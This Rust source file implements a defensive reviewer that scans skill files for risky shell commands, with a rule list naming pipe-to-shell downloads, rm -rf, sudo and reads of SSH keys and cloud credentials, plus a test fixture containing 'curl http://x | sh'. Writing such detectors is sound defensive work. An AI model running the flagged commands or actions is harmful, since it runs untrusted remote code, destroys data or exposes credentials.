//! Script-risk review shown before enabling or importing a skill: flags files and commands that
//! deserve a human look (downloads piped to a shell, `rm -rf`, `sudo`, secrets access...).

use std::collections::BTreeMap;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Risk {
    Info,
    Caution,
    High,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Finding {
    pub file: String,
    /// 1-based, 0 for whole-file findings.
    pub line: usize,
    pub risk: Risk,
    pub reason: &'static str,
    pub snippet: String,
}

const RULES: &[(&str, Risk, &str)] = &[
    ("curl ", Risk::Caution, "Downloads from the network"),
    ("wget ", Risk::Caution, "Downloads from the network"),
    ("| sh", Risk::High, "Pipes content into a shell"),
    ("| bash", Risk::High, "Pipes content into a shell"),
    ("rm -rf", Risk::High, "Recursively deletes files"),
    ("sudo ", Risk::High, "Runs with elevated privileges"),
    ("eval ", Risk::Caution, "Evaluates dynamic code"),
    ("base64 -d", Risk::Caution, "Decodes hidden content"),
    ("base64 --decode", Risk::Caution, "Decodes hidden content"),
    ("chmod +x", Risk::Info, "Makes a file executable"),
    ("chmod 777", Risk::Caution, "Opens file permissions"),
    (".ssh", Risk::High, "Touches SSH keys"),
    ("id_rsa", Risk::High, "Touches SSH keys"),
    (".aws/credentials", Risk::High, "Touches cloud credentials"),
    ("api_key", Risk::Caution, "Mentions credentials"),
    ("password", Risk::Info, "Mentions credentials"),
    ("os.system(", Risk::Caution, "Runs shell commands from code"),
    ("subprocess", Risk::Info, "Runs subprocesses"),
    ("child_process", Risk::Info, "Runs subprocesses"),
];

fn is_script(rel: &str) -> bool {
    rel.starts_with("scripts/")
        || matches!(
            rel.rsplit('.').next(),
            Some("sh" | "bash" | "zsh" | "py" | "js" | "ts" | "rb" | "pl" | "ps1" | "bat")
        )
}

/// Review `files` (relative path -> bytes). Findings are sorted by risk, highest first.
pub fn review_files(files: &BTreeMap<String, Vec<u8>>) -> Vec<Finding> {
    let mut out = vec![];
    for (rel, bytes) in files {
        let script = is_script(rel);
        if script {
            out.push(Finding {
                file: rel.clone(),
                line: 0,
                risk: Risk::Info,
                reason: "Executable script",
                snippet: String::new(),
            });
        }
        if !(script || rel.ends_with(".md") || rel.ends_with(".txt")) {
            continue;
        }
        let Ok(text) = std::str::from_utf8(bytes) else {
            continue;
        };
        for (i, line) in text.lines().enumerate() {
            let low = line.to_lowercase();
            let hit = RULES
                .iter()
                // prose in markdown only matters for the sharpest patterns
                .filter(|(pat, risk, _)| (script || *risk == Risk::High) && low.contains(pat))
                .max_by_key(|(_, risk, _)| *risk);
            if let Some((_, risk, reason)) = hit {
                out.push(Finding {
                    file: rel.clone(),
                    line: i + 1,
                    risk: *risk,
                    reason,
                    snippet: line.trim().chars().take(120).collect(),
                });
            }
        }
    }
    out.sort_by(|a, b| {
        b.risk
            .cmp(&a.risk)
            .then(a.file.cmp(&b.file))
            .then(a.line.cmp(&b.line))
    });
    out
}

pub fn max_risk(f: &[Finding]) -> Option<Risk> {
    f.iter().map(|x| x.risk).max()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn flags_risky_scripts() {
        let mut f = BTreeMap::new();
        f.insert(
            "scripts/i.sh".to_string(),
            b"#!/bin/sh\ncurl http://x | sh\nls\n".to_vec(),
        );
        f.insert(
            "SKILL.md".to_string(),
            b"Run `rm -rf build` and mention a password\n".to_vec(),
        );
        let r = review_files(&f);
        assert_eq!(max_risk(&r), Some(Risk::High));
        assert!(r
            .iter()
            .any(|x| x.file == "scripts/i.sh" && x.line == 2 && x.risk == Risk::High));
        assert!(r
            .iter()
            .any(|x| x.file == "SKILL.md" && x.reason.contains("deletes")));
        assert!(!r
            .iter()
            .any(|x| x.file == "SKILL.md" && x.risk == Risk::Info && x.line > 0));
    }

    #[test]
    fn clean_skill_has_no_findings() {
        let mut f = BTreeMap::new();
        f.insert(
            "SKILL.md".to_string(),
            b"---\nname: a\n---\nBe nice\n".to_vec(),
        );
        assert!(review_files(&f).is_empty());
    }
}
